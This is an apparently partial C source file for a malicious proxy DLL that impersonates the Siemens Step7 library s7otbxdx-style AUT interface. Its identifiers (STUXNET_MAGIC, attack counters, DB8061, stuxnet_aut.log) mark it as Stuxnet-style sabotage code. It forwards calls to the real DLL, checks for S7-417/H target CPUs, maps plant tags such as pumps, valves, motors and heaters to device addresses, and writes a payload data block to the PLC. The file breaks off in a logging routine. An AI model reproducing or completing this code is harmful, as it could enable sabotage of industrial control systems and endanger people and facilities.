typedef DWORD (WINAPI *AUTSetObjectDataEx)(DWORD, DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTDeleteObjectEx)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTCopyObject)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTMoveObject)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTRenameObject)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTLockObject)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTUnlockObject)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTIsObjectLocked)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectLockOwner)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectLockTime)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectLockDuration)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectLockDuration)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectLockType)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectLockType)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectLockCount)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectLockList)(DWORD, DWORD, DWORD, DWORD, DWORD);

typedef struct _AUT_FUNCTION_TABLE {
    AUTDoVerb                     pfnAUTDoVerb;
    AUTOpenObjectSet              pfnAUTOpenObjectSet;
    AUTCloseObjectSet             pfnAUTCloseObjectSet;
    AUTGetObject                  pfnAUTGetObject;
    AUTPutObject                  pfnAUTPutObject;
    AUTDeleteObject               pfnAUTDeleteObject;
    AUTFindFirst                  pfnAUTFindFirst;
    AUTFindNext                   pfnAUTFindNext;
    AUTGetInfo                    pfnAUTGetInfo;
    AUTSetInfo                    pfnAUTSetInfo;
    AUTGetData                    pfnAUTGetData;
    AUTSetData                    pfnAUTSetData;
    AUTGetVersion                 pfnAUTGetVersion;
    AUTInitialize                 pfnAUTInitialize;
    AUTDeinitialize               pfnAUTDeinitialize;
    AUTGetLastError               pfnAUTGetLastError;
    AUTSetLastError               pfnAUTSetLastError;
    AUTGetObjectSetInfo           pfnAUTGetObjectSetInfo;
    AUTSetObjectSetInfo           pfnAUTSetObjectSetInfo;
    AUTGetObjectInfo              pfnAUTGetObjectInfo;
    AUTSetObjectInfo              pfnAUTSetObjectInfo;
    AUTGetObjectData              pfnAUTGetObjectData;
    AUTSetObjectData              pfnAUTSetObjectData;
    AUTDeleteObjectData           pfnAUTDeleteObjectData;
    AUTGetObjectList              pfnAUTGetObjectList;
    AUTGetObjectSetList           pfnAUTGetObjectSetList;
    AUTGetObjectType              pfnAUTGetObjectType;
    AUTSetObjectType              pfnAUTSetObjectType;
    AUTGetObjectName              pfnAUTGetObjectName;
    AUTSetObjectName              pfnAUTSetObjectName;
    AUTGetObjectPath              pfnAUTGetObjectPath;
    AUTSetObjectPath              pfnAUTSetObjectPath;
    AUTGetObjectParent            pfnAUTGetObjectParent;
    AUTSetObjectParent            pfnAUTSetObjectParent;
    AUTGetObjectChildren          pfnAUTGetObjectChildren;
    AUTGetObjectAttributes        pfnAUTGetObjectAttributes;
    AUTSetObjectAttributes        pfnAUTSetObjectAttributes;
    AUTGetObjectPermissions       pfnAUTGetObjectPermissions;
    AUTSetObjectPermissions       pfnAUTSetObjectPermissions;
    AUTGetObjectOwner             pfnAUTGetObjectOwner;
    AUTSetObjectOwner             pfnAUTSetObjectOwner;
    AUTGetObjectGroup             pfnAUTGetObjectGroup;
    AUTSetObjectGroup             pfnAUTSetObjectGroup;
    AUTGetObjectACL               pfnAUTGetObjectACL;
    AUTSetObjectACL               pfnAUTSetObjectACL;
    AUTGetObjectSID               pfnAUTGetObjectSID;
    AUTSetObjectSID               pfnAUTSetObjectSID;
    AUTGetObjectGUID              pfnAUTGetObjectGUID;
    AUTSetObjectGUID              pfnAUTSetObjectGUID;
    AUTGetObjectCreationTime      pfnAUTGetObjectCreationTime;
    AUTGetObjectModificationTime  pfnAUTGetObjectModificationTime;
    AUTGetObjectAccessTime        pfnAUTGetObjectAccessTime;
    AUTGetObjectSize              pfnAUTGetObjectSize;
    AUTGetObjectChecksum          pfnAUTGetObjectChecksum;
    AUTSetObjectChecksum          pfnAUTSetObjectChecksum;
    AUTGetObjectVersion           pfnAUTGetObjectVersion;
    AUTSetObjectVersion           pfnAUTSetObjectVersion;
    AUTGetObjectState             pfnAUTGetObjectState;
    AUTSetObjectState             pfnAUTSetObjectState;
    AUTGetObjectStatus            pfnAUTGetObjectStatus;
    AUTSetObjectStatus            pfnAUTSetObjectStatus;
    AUTGetObjectError             pfnAUTGetObjectError;
    AUTSetObjectError             pfnAUTSetObjectError;
    AUTGetObjectWarning           pfnAUTGetObjectWarning;
    AUTSetObjectWarning           pfnAUTSetObjectWarning;
    AUTGetObjectInfoEx            pfnAUTGetObjectInfoEx;
    AUTSetObjectInfoEx            pfnAUTSetObjectInfoEx;
    AUTGetObjectDataEx            pfnAUTGetObjectDataEx;
    AUTSetObjectDataEx            pfnAUTSetObjectDataEx;
    AUTDeleteObjectEx             pfnAUTDeleteObjectEx;
    AUTCopyObject                 pfnAUTCopyObject;
    AUTMoveObject                 pfnAUTMoveObject;
    AUTRenameObject               pfnAUTRenameObject;
    AUTLockObject                 pfnAUTLockObject;
    AUTUnlockObject               pfnAUTUnlockObject;
    AUTIsObjectLocked             pfnAUTIsObjectLocked;
    AUTGetObjectLockOwner         pfnAUTGetObjectLockOwner;
    AUTGetObjectLockTime          pfnAUTGetObjectLockTime;
    AUTGetObjectLockDuration      pfnAUTGetObjectLockDuration;
    AUTSetObjectLockDuration      pfnAUTSetObjectLockDuration;
    AUTGetObjectLockType          pfnAUTGetObjectLockType;
    AUTSetObjectLockType          pfnAUTSetObjectLockType;
    AUTGetObjectLockCount         pfnAUTGetObjectLockCount;
    AUTGetObjectLockList          pfnAUTGetObjectLockList;
} AUT_FUNCTION_TABLE, * PAUT_FUNCTION_TABLE;

static AUT_FUNCTION_TABLE g_OriginalFunctions = {0};
static HMODULE g_hOriginalDll = NULL;
static CRITICAL_SECTION g_csLock;
static BOOL g_bInitialized = FALSE;

static DWORD g_dwCPUType = 0;
static BOOL g_bTargetVerified = FALSE;
static DWORD g_dwDB8061Created = 0;
static DWORD g_dwSymbolCount = 0;
static DWORD g_dwAttackCount = 0;

typedef struct _SYMBOL_TAG {
    WCHAR szFullTag[64];
    WCHAR szDelimiter[4];
    WCHAR szFunctionId[16];
    WCHAR szCascadeModule[8];
    DWORD dwCascadeNumber;
    DWORD dwDeviceNumber;
    DWORD dwDeviceAddress;
} SYMBOL_TAG, * PSYMBOL_TAG;

static SYMBOL_TAG g_SymbolTags[256];
static DWORD g_dwSymbolTagCount = 0;

typedef struct _DB8061_DATA {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwTargetCPUType;
    DWORD dwSymbolCount;
    DWORD dwAttackCount;
    DWORD dwReserved1[8];
    BYTE bSymbolData[4096];
    BYTE bReserved2[4096];
} DB8061_DATA, * PDB8061_DATA;

static DB8061_DATA g_DB8061Data;
static BOOL LoadOriginalDll(VOID);
static VOID InitFunctionPointers(VOID);
static BOOL IsTargetSystem(VOID);
static BOOL CreateDB8061(VOID);
static BOOL ParseSymbolTags(VOID);
static BOOL AddSymbolTag(LPCWSTR szTag);
static DWORD ResolveDeviceAddress(PSYMBOL_TAG pTag);
static BOOL IsValidCPUType(DWORD dwCPUType);
static VOID LogEvent(LPCWSTR szEvent);
static VOID LogError(LPCWSTR szError);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    TCHAR szDbgMsg[256];

    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            wsprintf(szDbgMsg, _T("[S7AAAPIX] DllMain: PROCESS_ATTACH, PID=%d\n"), GetCurrentProcessId());
            OutputDebugString(szDbgMsg);

            InitializeCriticalSection(&g_csLock);

            if (!LoadOriginalDll()) {
                wsprintf(szDbgMsg, _T("[S7AAAPIX] ERROR: Failed to load original DLL %s\n"), S7AAAPIX_ORIGINAL_DLL_NAME);
                OutputDebugString(szDbgMsg);
            } else {
                InitFunctionPointers();
                g_bInitialized = TRUE;
                wsprintf(szDbgMsg, _T("[S7AAAPIX] Initialized successfully. Original DLL loaded at 0x%08X\n"), g_hOriginalDll);
                OutputDebugString(szDbgMsg);
            }
            break;

        case DLL_PROCESS_DETACH:
            wsprintf(szDbgMsg, _T("[S7AAAPIX] DllMain: PROCESS_DETACH\n"));
            OutputDebugString(szDbgMsg);

            if (g_hOriginalDll) {
                FreeLibrary(g_hOriginalDll);
                g_hOriginalDll = NULL;
            }
            DeleteCriticalSection(&g_csLock);
            g_bInitialized = FALSE;
            break;

        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

static BOOL LoadOriginalDll(VOID) {
    TCHAR szSystemPath[MAX_PATH];
    TCHAR szDllPath[MAX_PATH];
    TCHAR szProgramFilesPath[MAX_PATH];

    if (GetSystemDirectory(szSystemPath, MAX_PATH)) {
        wsprintf(szDllPath, _T("%s\\%s"), szSystemPath, S7AAAPIX_ORIGINAL_DLL_NAME);
        g_hOriginalDll = LoadLibrary(szDllPath);
        if (g_hOriginalDll) {
            return TRUE;
        }
    }

    if (GetEnvironmentVariable(_T("ProgramFiles"), szProgramFilesPath, MAX_PATH)) {
        wsprintf(szDllPath, _T("%s\\Siemens\\Step7\\S7BIN\\%s"), szProgramFilesPath, S7AAAPIX_ORIGINAL_DLL_NAME);
        g_hOriginalDll = LoadLibrary(szDllPath);
        if (g_hOriginalDll) {
            return TRUE;
        }
    }

    g_hOriginalDll = LoadLibrary(S7AAAPIX_ORIGINAL_DLL_NAME);
    return (g_hOriginalDll != NULL);
}

static VOID InitFunctionPointers(VOID) {
    g_OriginalFunctions.pfnAUTDoVerb = (AUTDoVerb)GetProcAddress(g_hOriginalDll, "AUTDoVerb");
    g_OriginalFunctions.pfnAUTOpenObjectSet = (AUTOpenObjectSet)GetProcAddress(g_hOriginalDll, "AUTOpenObjectSet");
    g_OriginalFunctions.pfnAUTCloseObjectSet = (AUTCloseObjectSet)GetProcAddress(g_hOriginalDll, "AUTCloseObjectSet");
    g_OriginalFunctions.pfnAUTGetObject = (AUTGetObject)GetProcAddress(g_hOriginalDll, "AUTGetObject");
    g_OriginalFunctions.pfnAUTPutObject = (AUTPutObject)GetProcAddress(g_hOriginalDll, "AUTPutObject");
    g_OriginalFunctions.pfnAUTDeleteObject = (AUTDeleteObject)GetProcAddress(g_hOriginalDll, "AUTDeleteObject");
    g_OriginalFunctions.pfnAUTFindFirst = (AUTFindFirst)GetProcAddress(g_hOriginalDll, "AUTFindFirst");
    g_OriginalFunctions.pfnAUTFindNext = (AUTFindNext)GetProcAddress(g_hOriginalDll, "AUTFindNext");
    g_OriginalFunctions.pfnAUTGetInfo = (AUTGetInfo)GetProcAddress(g_hOriginalDll, "AUTGetInfo");
    g_OriginalFunctions.pfnAUTSetInfo = (AUTSetInfo)GetProcAddress(g_hOriginalDll, "AUTSetInfo");
    g_OriginalFunctions.pfnAUTGetData = (AUTGetData)GetProcAddress(g_hOriginalDll, "AUTGetData");
    g_OriginalFunctions.pfnAUTSetData = (AUTSetData)GetProcAddress(g_hOriginalDll, "AUTSetData");
    g_OriginalFunctions.pfnAUTGetVersion = (AUTGetVersion)GetProcAddress(g_hOriginalDll, "AUTGetVersion");
    g_OriginalFunctions.pfnAUTInitialize = (AUTInitialize)GetProcAddress(g_hOriginalDll, "AUTInitialize");
    g_OriginalFunctions.pfnAUTDeinitialize = (AUTDeinitialize)GetProcAddress(g_hOriginalDll, "AUTDeinitialize");
    g_OriginalFunctions.pfnAUTGetLastError = (AUTGetLastError)GetProcAddress(g_hOriginalDll, "AUTGetLastError");
    g_OriginalFunctions.pfnAUTSetLastError = (AUTSetLastError)GetProcAddress(g_hOriginalDll, "AUTSetLastError");
    g_OriginalFunctions.pfnAUTGetObjectSetInfo = (AUTGetObjectSetInfo)GetProcAddress(g_hOriginalDll, "AUTGetObjectSetInfo");
    g_OriginalFunctions.pfnAUTSetObjectSetInfo = (AUTSetObjectSetInfo)GetProcAddress(g_hOriginalDll, "AUTSetObjectSetInfo");
    g_OriginalFunctions.pfnAUTGetObjectInfo = (AUTGetObjectInfo)GetProcAddress(g_hOriginalDll, "AUTGetObjectInfo");
    g_OriginalFunctions.pfnAUTSetObjectInfo = (AUTSetObjectInfo)GetProcAddress(g_hOriginalDll, "AUTSetObjectInfo");
    g_OriginalFunctions.pfnAUTGetObjectData = (AUTGetObjectData)GetProcAddress(g_hOriginalDll, "AUTGetObjectData");
    g_OriginalFunctions.pfnAUTSetObjectData = (AUTSetObjectData)GetProcAddress(g_hOriginalDll, "AUTSetObjectData");
    g_OriginalFunctions.pfnAUTDeleteObjectData = (AUTDeleteObjectData)GetProcAddress(g_hOriginalDll, "AUTDeleteObjectData");
    g_OriginalFunctions.pfnAUTGetObjectList = (AUTGetObjectList)GetProcAddress(g_hOriginalDll, "AUTGetObjectList");
    g_OriginalFunctions.pfnAUTGetObjectSetList = (AUTGetObjectSetList)GetProcAddress(g_hOriginalDll, "AUTGetObjectSetList");
    g_OriginalFunctions.pfnAUTGetObjectType = (AUTGetObjectType)GetProcAddress(g_hOriginalDll, "AUTGetObjectType");
    g_OriginalFunctions.pfnAUTSetObjectType = (AUTSetObjectType)GetProcAddress(g_hOriginalDll, "AUTSetObjectType");
    g_OriginalFunctions.pfnAUTGetObjectName = (AUTGetObjectName)GetProcAddress(g_hOriginalDll, "AUTGetObjectName");
    g_OriginalFunctions.pfnAUTSetObjectName = (AUTSetObjectName)GetProcAddress(g_hOriginalDll, "AUTSetObjectName");
    g_OriginalFunctions.pfnAUTGetObjectPath = (AUTGetObjectPath)GetProcAddress(g_hOriginalDll, "AUTGetObjectPath");
    g_OriginalFunctions.pfnAUTSetObjectPath = (AUTSetObjectPath)GetProcAddress(g_hOriginalDll, "AUTSetObjectPath");
    g_OriginalFunctions.pfnAUTGetObjectParent = (AUTGetObjectParent)GetProcAddress(g_hOriginalDll, "AUTGetObjectParent");
    g_OriginalFunctions.pfnAUTSetObjectParent = (AUTSetObjectParent)GetProcAddress(g_hOriginalDll, "AUTSetObjectParent");
    g_OriginalFunctions.pfnAUTGetObjectChildren = (AUTGetObjectChildren)GetProcAddress(g_hOriginalDll, "AUTGetObjectChildren");
    g_OriginalFunctions.pfnAUTGetObjectAttributes = (AUTGetObjectAttributes)GetProcAddress(g_hOriginalDll, "AUTGetObjectAttributes");
    g_OriginalFunctions.pfnAUTSetObjectAttributes = (AUTSetObjectAttributes)GetProcAddress(g_hOriginalDll, "AUTSetObjectAttributes");
    g_OriginalFunctions.pfnAUTGetObjectPermissions = (AUTGetObjectPermissions)GetProcAddress(g_hOriginalDll, "AUTGetObjectPermissions");
    g_OriginalFunctions.pfnAUTSetObjectPermissions = (AUTSetObjectPermissions)GetProcAddress(g_hOriginalDll, "AUTSetObjectPermissions");
    g_OriginalFunctions.pfnAUTGetObjectOwner = (AUTGetObjectOwner)GetProcAddress(g_hOriginalDll, "AUTGetObjectOwner");
    g_OriginalFunctions.pfnAUTSetObjectOwner = (AUTSetObjectOwner)GetProcAddress(g_hOriginalDll, "AUTSetObjectOwner");
    g_OriginalFunctions.pfnAUTGetObjectGroup = (AUTGetObjectGroup)GetProcAddress(g_hOriginalDll, "AUTGetObjectGroup");
    g_OriginalFunctions.pfnAUTSetObjectGroup = (AUTSetObjectGroup)GetProcAddress(g_hOriginalDll, "AUTSetObjectGroup");
    g_OriginalFunctions.pfnAUTGetObjectACL = (AUTGetObjectACL)GetProcAddress(g_hOriginalDll, "AUTGetObjectACL");
    g_OriginalFunctions.pfnAUTSetObjectACL = (AUTSetObjectACL)GetProcAddress(g_hOriginalDll, "AUTSetObjectACL");
    g_OriginalFunctions.pfnAUTGetObjectSID = (AUTGetObjectSID)GetProcAddress(g_hOriginalDll, "AUTGetObjectSID");
    g_OriginalFunctions.pfnAUTSetObjectSID = (AUTSetObjectSID)GetProcAddress(g_hOriginalDll, "AUTSetObjectSID");
    g_OriginalFunctions.pfnAUTGetObjectGUID = (AUTGetObjectGUID)GetProcAddress(g_hOriginalDll, "AUTGetObjectGUID");
    g_OriginalFunctions.pfnAUTSetObjectGUID = (AUTSetObjectGUID)GetProcAddress(g_hOriginalDll, "AUTSetObjectGUID");
    g_OriginalFunctions.pfnAUTGetObjectCreationTime = (AUTGetObjectCreationTime)GetProcAddress(g_hOriginalDll, "AUTGetObjectCreationTime");
    g_OriginalFunctions.pfnAUTGetObjectModificationTime = (AUTGetObjectModificationTime)GetProcAddress(g_hOriginalDll, "AUTGetObjectModificationTime");
    g_OriginalFunctions.pfnAUTGetObjectAccessTime = (AUTGetObjectAccessTime)GetProcAddress(g_hOriginalDll, "AUTGetObjectAccessTime");
    g_OriginalFunctions.pfnAUTGetObjectSize = (AUTGetObjectSize)GetProcAddress(g_hOriginalDll, "AUTGetObjectSize");
    g_OriginalFunctions.pfnAUTGetObjectChecksum = (AUTGetObjectChecksum)GetProcAddress(g_hOriginalDll, "AUTGetObjectChecksum");
    g_OriginalFunctions.pfnAUTSetObjectChecksum = (AUTSetObjectChecksum)GetProcAddress(g_hOriginalDll, "AUTSetObjectChecksum");
    g_OriginalFunctions.pfnAUTGetObjectVersion = (AUTGetObjectVersion)GetProcAddress(g_hOriginalDll, "AUTGetObjectVersion");
    g_OriginalFunctions.pfnAUTSetObjectVersion = (AUTSetObjectVersion)GetProcAddress(g_hOriginalDll, "AUTSetObjectVersion");
    g_OriginalFunctions.pfnAUTGetObjectState = (AUTGetObjectState)GetProcAddress(g_hOriginalDll, "AUTGetObjectState");
    g_OriginalFunctions.pfnAUTSetObjectState = (AUTSetObjectState)GetProcAddress(g_hOriginalDll, "AUTSetObjectState");
    g_OriginalFunctions.pfnAUTGetObjectStatus = (AUTGetObjectStatus)GetProcAddress(g_hOriginalDll, "AUTGetObjectStatus");
    g_OriginalFunctions.pfnAUTSetObjectStatus = (AUTSetObjectStatus)GetProcAddress(g_hOriginalDll, "AUTSetObjectStatus");
    g_OriginalFunctions.pfnAUTGetObjectError = (AUTGetObjectError)GetProcAddress(g_hOriginalDll, "AUTGetObjectError");
    g_OriginalFunctions.pfnAUTSetObjectError = (AUTSetObjectError)GetProcAddress(g_hOriginalDll, "AUTSetObjectError");
    g_OriginalFunctions.pfnAUTGetObjectWarning = (AUTGetObjectWarning)GetProcAddress(g_hOriginalDll, "AUTGetObjectWarning");
    g_OriginalFunctions.pfnAUTSetObjectWarning = (AUTSetObjectWarning)GetProcAddress(g_hOriginalDll, "AUTSetObjectWarning");
    g_OriginalFunctions.pfnAUTGetObjectInfoEx = (AUTGetObjectInfoEx)GetProcAddress(g_hOriginalDll, "AUTGetObjectInfoEx");
    g_OriginalFunctions.pfnAUTSetObjectInfoEx = (AUTSetObjectInfoEx)GetProcAddress(g_hOriginalDll, "AUTSetObjectInfoEx");
    g_OriginalFunctions.pfnAUTGetObjectDataEx = (AUTGetObjectDataEx)GetProcAddress(g_hOriginalDll, "AUTGetObjectDataEx");
    g_OriginalFunctions.pfnAUTSetObjectDataEx = (AUTSetObjectDataEx)GetProcAddress(g_hOriginalDll, "AUTSetObjectDataEx");
    g_OriginalFunctions.pfnAUTDeleteObjectEx = (AUTDeleteObjectEx)GetProcAddress(g_hOriginalDll, "AUTDeleteObjectEx");
    g_OriginalFunctions.pfnAUTCopyObject = (AUTCopyObject)GetProcAddress(g_hOriginalDll, "AUTCopyObject");
    g_OriginalFunctions.pfnAUTMoveObject = (AUTMoveObject)GetProcAddress(g_hOriginalDll, "AUTMoveObject");
    g_OriginalFunctions.pfnAUTRenameObject = (AUTRenameObject)GetProcAddress(g_hOriginalDll, "AUTRenameObject");
    g_OriginalFunctions.pfnAUTLockObject = (AUTLockObject)GetProcAddress(g_hOriginalDll, "AUTLockObject");
    g_OriginalFunctions.pfnAUTUnlockObject = (AUTUnlockObject)GetProcAddress(g_hOriginalDll, "AUTUnlockObject");
    g_OriginalFunctions.pfnAUTIsObjectLocked = (AUTIsObjectLocked)GetProcAddress(g_hOriginalDll, "AUTIsObjectLocked");
    g_OriginalFunctions.pfnAUTGetObjectLockOwner = (AUTGetObjectLockOwner)GetProcAddress(g_hOriginalDll, "AUTGetObjectLockOwner");
    g_OriginalFunctions.pfnAUTGetObjectLockTime = (AUTGetObjectLockTime)GetProcAddress(g_hOriginalDll, "AUTGetObjectLockTime");
    g_OriginalFunctions.pfnAUTGetObjectLockDuration = (AUTGetObjectLockDuration)GetProcAddress(g_hOriginalDll, "AUTGetObjectLockDuration");
    g_OriginalFunctions.pfnAUTSetObjectLockDuration = (AUTSetObjectLockDuration)GetProcAddress(g_hOriginalDll, "AUTSetObjectLockDuration");
    g_OriginalFunctions.pfnAUTGetObjectLockType = (AUTGetObjectLockType)GetProcAddress(g_hOriginalDll, "AUTGetObjectLockType");
    g_OriginalFunctions.pfnAUTSetObjectLockType = (AUTSetObjectLockType)GetProcAddress(g_hOriginalDll, "AUTSetObjectLockType");
    g_OriginalFunctions.pfnAUTGetObjectLockCount = (AUTGetObjectLockCount)GetProcAddress(g_hOriginalDll, "AUTGetObjectLockCount");
    g_OriginalFunctions.pfnAUTGetObjectLockList = (AUTGetObjectLockList)GetProcAddress(g_hOriginalDll, "AUTGetObjectLockList");
}

static BOOL IsTargetSystem(VOID) {
    if (!g_OriginalFunctions.pfnAUTGetInfo) return FALSE;

    g_dwCPUType = 0;
    g_OriginalFunctions.pfnAUTGetInfo(0, 0, (DWORD)&g_dwCPUType);

    if (IsValidCPUType(g_dwCPUType)) {
        g_bTargetVerified = TRUE;
        return TRUE;
    }

    g_bTargetVerified = FALSE;
    return FALSE;
}

static BOOL IsValidCPUType(DWORD dwCPUType) {
    if (dwCPUType == S7AAAPIX_TARGET_CPU_417) {
        return TRUE;
    }
    if (dwCPUType == S7AAAPIX_TARGET_CPU_H) {
        return TRUE;
    }
    return FALSE;
}

static BOOL ParseSymbolTags(VOID) {
    DWORD dwIndex = 0;
    WCHAR szTagBuffer[256];
    WCHAR szCurrentTag[64];
    DWORD dwPos = 0;
    BOOL bInTag = FALSE;

    if (!g_OriginalFunctions.pfnAUTGetObjectList) {
        return FALSE;
    }

    ZeroMemory(szTagBuffer, sizeof(szTagBuffer));
    if (g_OriginalFunctions.pfnAUTGetObjectList(0, (DWORD)szTagBuffer, sizeof(szTagBuffer), 0) != 0) {
        return FALSE;
    }

    g_dwSymbolTagCount = 0;

    for (dwIndex = 0; dwIndex < wcslen(szTagBuffer); dwIndex++) {
        WCHAR ch = szTagBuffer[dwIndex];

        if (ch == L' ' || ch == L'-' || ch == L'_' || ch == L'\0') {
            if (bInTag && dwPos > 0) {
                szCurrentTag[dwPos] = L'\0';
                AddSymbolTag(szCurrentTag);
                dwPos = 0;
                bInTag = FALSE;
            }
            if (ch == L'\0') break;
        } else {
            if (!bInTag) {
                bInTag = TRUE;
                dwPos = 0;
            }
            if (dwPos < 63) {
                szCurrentTag[dwPos++] = ch;
            }
        }
    }

    if (bInTag && dwPos > 0) {
        szCurrentTag[dwPos] = L'\0';
        AddSymbolTag(szCurrentTag);
    }

    g_dwSymbolCount = g_dwSymbolTagCount;
    return (g_dwSymbolTagCount > 0);
}

static BOOL AddSymbolTag(LPCWSTR szTag) {
    PSYMBOL_TAG pTag;
    WCHAR szTemp[64];
    WCHAR *pDelim1, *pDelim2, *pDelim3;
    DWORD dwLen;

    if (!szTag || g_dwSymbolTagCount >= 256) {
        return FALSE;
    }

    pTag = &g_SymbolTags[g_dwSymbolTagCount];
    ZeroMemory(pTag, sizeof(SYMBOL_TAG));

    wcsncpy_s(pTag->szFullTag, 64, szTag, _TRUNCATE);
    wcsncpy_s(szTemp, 64, szTag, _TRUNCATE);

    pDelim1 = wcschr(szTemp, L'-');
    if (!pDelim1) {
        pDelim1 = wcschr(szTemp, L'_');
    }
    if (!pDelim1) {
        pDelim1 = wcschr(szTemp, L' ');
    }

    if (pDelim1) {
        dwLen = (DWORD)(pDelim1 - szTemp);
        if (dwLen > 0 && dwLen < 16) {
            wcsncpy_s(pTag->szFunctionId, 16, szTemp, dwLen);
            wcsncpy_s(pTag->szDelimiter, 4, pDelim1, 1);
        }

        pDelim2 = wcschr(pDelim1 + 1, L'-');
        if (!pDelim2) {
            pDelim2 = wcschr(pDelim1 + 1, L'_');
        }
        if (!pDelim2) {
            pDelim2 = wcschr(pDelim1 + 1, L' ');
        }

        if (pDelim2) {
            dwLen = (DWORD)(pDelim2 - pDelim1 - 1);
            if (dwLen > 0 && dwLen < 8) {
                wcsncpy_s(pTag->szCascadeModule, 8, pDelim1 + 1, dwLen);
            }

            pDelim3 = wcschr(pDelim2 + 1, L'-');
            if (!pDelim3) {
                pDelim3 = wcschr(pDelim2 + 1, L'_');
            }
            if (!pDelim3) {
                pDelim3 = wcschr(pDelim2 + 1, L' ');
            }

            if (pDelim3) {
                pTag->dwCascadeNumber = _wtoi(pDelim2 + 1);
                pTag->dwDeviceNumber = _wtoi(pDelim3 + 1);
            } else {
                pTag->dwCascadeNumber = _wtoi(pDelim2 + 1);
                pTag->dwDeviceNumber = 0;
            }
        } else {
            pTag->dwCascadeNumber = _wtoi(pDelim1 + 1);
            pTag->dwDeviceNumber = 0;
        }
    } else {
        wcsncpy_s(pTag->szFunctionId, 16, szTemp, _TRUNCATE);
        pTag->dwCascadeNumber = 0;
        pTag->dwDeviceNumber = 0;
    }

    pTag->dwDeviceAddress = ResolveDeviceAddress(pTag);
    g_dwSymbolTagCount++;

    return TRUE;
}

static DWORD ResolveDeviceAddress(PSYMBOL_TAG pTag) {
    DWORD dwAddress = 0;
    DWORD dwBase = 0;

    if (!pTag) return 0;

    if (wcscmp(pTag->szFunctionId, L"PIA") == 0 ||
        wcscmp(pTag->szFunctionId, L"PIC") == 0 ||
        wcscmp(pTag->szFunctionId, L"PI") == 0) {
        dwBase = 0x100;
    } else if (wcscmp(pTag->szFunctionId, L"TIA") == 0 ||
               wcscmp(pTag->szFunctionId, L"TIC") == 0 ||
               wcscmp(pTag->szFunctionId, L"TI") == 0) {
        dwBase = 0x200;
    } else if (wcscmp(pTag->szFunctionId, L"LIA") == 0 ||
               wcscmp(pTag->szFunctionId, L"LIC") == 0 ||
               wcscmp(pTag->szFunctionId, L"LI") == 0) {
        dwBase = 0x300;
    } else if (wcscmp(pTag->szFunctionId, L"FIA") == 0 ||
               wcscmp(pTag->szFunctionId, L"FIC") == 0 ||
               wcscmp(pTag->szFunctionId, L"FI") == 0) {
        dwBase = 0x400;
    } else if (wcscmp(pTag->szFunctionId, L"VIA") == 0 ||
               wcscmp(pTag->szFunctionId, L"VIC") == 0 ||
               wcscmp(pTag->szFunctionId, L"VI") == 0) {
        dwBase = 0x500;
    } else if (wcscmp(pTag->szFunctionId, L"QIA") == 0 ||
               wcscmp(pTag->szFunctionId, L"QIC") == 0 ||
               wcscmp(pTag->szFunctionId, L"QI") == 0) {
        dwBase = 0x600;
    } else if (wcscmp(pTag->szFunctionId, L"SIA") == 0 ||
               wcscmp(pTag->szFunctionId, L"SIC") == 0 ||
               wcscmp(pTag->szFunctionId, L"SI") == 0) {
        dwBase = 0x700;
    } else if (wcscmp(pTag->szFunctionId, L"P") == 0 ||
               wcscmp(pTag->szFunctionId, L"Pump") == 0) {
        dwBase = 0x800;
    } else if (wcscmp(pTag->szFunctionId, L"V") == 0 ||
               wcscmp(pTag->szFunctionId, L"Valve") == 0) {
        dwBase = 0x900;
    } else if (wcscmp(pTag->szFunctionId, L"M") == 0 ||
               wcscmp(pTag->szFunctionId, L"Motor") == 0) {
        dwBase = 0xA00;
    } else if (wcscmp(pTag->szFunctionId, L"H") == 0 ||
               wcscmp(pTag->szFunctionId, L"Heater") == 0) {
        dwBase = 0xB00;
    } else {
        dwBase = 0x000;
    }

    dwAddress = dwBase + (pTag->dwCascadeNumber * 16) + pTag->dwDeviceNumber;

    return dwAddress;
}

static BOOL CreateDB8061(VOID) {
    PDB8061_DATA pData;
    DWORD dwDataSize;
    DWORD dwIndex;

    if (!g_OriginalFunctions.pfnAUTPutObject) {
        return FALSE;
    }

    ZeroMemory(&g_DB8061Data, sizeof(DB8061_DATA));

    pData = &g_DB8061Data;
    pData->dwMagic = STUXNET_MAGIC;
    pData->dwVersion = STUXNET_VERSION;
    pData->dwFlags = 0x00000001;
    pData->dwTargetCPUType = g_dwCPUType;
    pData->dwSymbolCount = g_dwSymbolTagCount;
    pData->dwAttackCount = g_dwAttackCount;

    dwDataSize = sizeof(DB8061_DATA);
    dwDataSize = min(dwDataSize, S7AAAPIX_MAX_DB_SIZE);

    if (g_OriginalFunctions.pfnAUTPutObject(S7AAAPIX_DB8061_NUMBER, (DWORD)&g_DB8061Data, dwDataSize, 0) != 0) {
        return FALSE;
    }

    g_dwDB8061Created++;
    return TRUE;
}

static VOID LogEvent(LPCWSTR szEvent) {
    TCHAR szLogPath[MAX_PATH];
    HANDLE hFile;
    DWORD dwWritten;
    SYSTEMTIME st;
    TCHAR szBuffer[1024];

    if (!szEvent) return;

    GetSystemDirectory(szLogPath, MAX_PATH);
    wcscat_s(szLogPath, MAX_PATH, _T("\\stuxnet_aut.log"));

